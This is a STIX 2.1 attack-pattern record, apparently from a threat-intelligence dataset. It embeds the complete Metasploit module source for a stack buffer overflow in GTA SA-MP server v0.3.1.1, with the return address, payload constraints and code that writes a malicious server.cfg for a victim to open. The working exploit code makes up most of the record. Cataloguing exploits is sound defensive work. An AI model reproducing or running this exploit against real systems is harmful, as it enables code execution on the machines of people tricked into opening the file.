{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6719294-6856-4107-bc55-50aff60305d0",
    "created": "2024-08-14T16:35:42.479389Z",
    "modified": "2024-08-14T16:35:42.479393Z",
    "name": "GTA SA-MP server.cfg Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in GTA SA-MP Server. This buffer overflow occurs when the application attempts to open a malformed server.cfg file.  To exploit this vulnerability, an attacker must send the victim a server.cfg file and have them run samp-server.exe.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/gta_samp.rb",
            "external_id": "gta_samp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'GTA SA-MP server.cfg Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in GTA SA-MP Server.\n        This buffer overflow occurs when the application attempts to open a malformed\n        server.cfg file.  To exploit this vulnerability, an attacker must send the\n        victim a server.cfg file and have them run samp-server.exe.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Silent_Dream',  # Original discovery, MSF Module, template by mona.py\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '83433' ],\n          [ 'EDB', '17893' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x0d\\x0a\\x1a\",\n          'Space'          => 392,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\",\n          'DisableNops'    => true,\n          'MaxSize'        => 392,\n        },\n\n      'Targets'        =>\n        [\n          [\n            'GTA SA-MP (samp-server) v0.3.1.1',\n            {\n              'Ret' => 0x00429faa, # PUSH ESP; RET (samp-server.exe)\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-09-18',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.', 'server.cfg'])\n      ])\n\n  end\n\n  def exploit\n\n    buffer = \"echo \"\n    buffer << rand_text_alpha_upper(379)\n    buffer << [target.ret].pack('V')\n    buffer << payload.encoded\n    file_create(buffer)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-09-18",
    "x_mitre_platforms": [
        "win'"
    ]
}